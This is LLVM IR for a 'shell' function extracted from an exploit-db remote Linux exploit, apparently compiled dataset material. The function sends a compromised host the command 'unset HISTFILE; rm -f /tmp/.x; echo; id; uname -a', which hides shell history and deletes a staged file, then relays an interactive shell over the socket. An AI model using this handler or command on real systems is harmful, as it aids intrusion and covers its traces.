; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_39.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_39.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shell.buff = internal global [1024 x i8] zeroinitializer, align 16
@__const.shell.INIT_CMD = private unnamed_addr constant [51 x i8] c"unset HISTFILE; rm -f /tmp/.x; echo; id; uname -a\0A\00", align 16
@.str = private unnamed_addr constant [11 x i8] c"[-] Select\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [9 x i8] c"[-] Read\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"[-] Write\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [51 x i8], align 16
  store i32 %0, i32* %2, align 4
  %6 = bitcast [51 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %6, i8* align 16 getelementptr inbounds ([51 x i8], [51 x i8]* @__const.shell.INIT_CMD, i32 0, i32 0), i64 51, i1 false)
  %7 = load i32, i32* %2, align 4
  %8 = getelementptr inbounds [51 x i8], [51 x i8]* %5, i64 0, i64 0
  %9 = getelementptr inbounds [51 x i8], [51 x i8]* %5, i64 0, i64 0
  %10 = call i32 @strlen(i8* %9)
  %11 = call i32 @write(i32 %7, i8* %8, i32 %10)
  br label %12

12:                                               ; preds = %1, %60
  %13 = call i32 @FD_ZERO(i32* %4)
  %14 = call i32 @FD_SET(i32 0, i32* %4)
  %15 = load i32, i32* %2, align 4
  %16 = call i32 @FD_SET(i32 %15, i32* %4)
  %17 = load i32, i32* %2, align 4
  %18 = add nsw i32 %17, 1
  %19 = call i32 @select(i32 %18, i32* %4, i32* null, i32* null, i32* null)
  %20 = icmp slt i32 %19, 1
  br i1 %20, label %21, label %25

21:                                               ; preds = %12
  %22 = call i32 @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0))
  %23 = load i32, i32* @EXIT_FAILURE, align 4
  %24 = call i32 @exit(i32 %23) #4
  unreachable

25:                                               ; preds = %12
  %26 = call i64 @FD_ISSET(i32 0, i32* %4)
  %27 = icmp ne i64 %26, 0
  br i1 %27, label %28, label %46

28:                                               ; preds = %25
  %29 = call i32 @read(i32 0, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 1024)
  store i32 %29, i32* %3, align 4
  %30 = icmp slt i32 %29, 1
  br i1 %30, label %31, label %35

31:                                               ; preds = %28
  %32 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %33 = load i32, i32* @EXIT_FAILURE, align 4
  %34 = call i32 @exit(i32 %33) #4
  unreachable

35:                                               ; preds = %28
  %36 = load i32, i32* %2, align 4
  %37 = load i32, i32* %3, align 4
  %38 = call i32 @write(i32 %36, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 %37)
  %39 = load i32, i32* %3, align 4
  %40 = icmp ne i32 %38, %39
  br i1 %40, label %41, label %45

41:                                               ; preds = %35
  %42 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %43 = load i32, i32* @EXIT_FAILURE, align 4
  %44 = call i32 @exit(i32 %43) #4
  unreachable

45:                                               ; preds = %35
  br label %46

46:                                               ; preds = %45, %25
  %47 = load i32, i32* %2, align 4
  %48 = call i64 @FD_ISSET(i32 %47, i32* %4)
  %49 = icmp ne i64 %48, 0
  br i1 %49, label %50, label %60

50:                                               ; preds = %46
  %51 = load i32, i32* %2, align 4
  %52 = call i32 @read(i32 %51, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 1024)
  store i32 %52, i32* %3, align 4
  %53 = icmp slt i32 %52, 1
  br i1 %53, label %54, label %57

54:                                               ; preds = %50
  %55 = load i32, i32* @EXIT_SUCCESS, align 4
  %56 = call i32 @exit(i32 %55) #4
  unreachable

57:                                               ; preds = %50
  %58 = load i32, i32* %3, align 4
  %59 = call i32 @write(i32 1, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 %58)
  br label %60

60:                                               ; preds = %57, %46
  br label %12
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
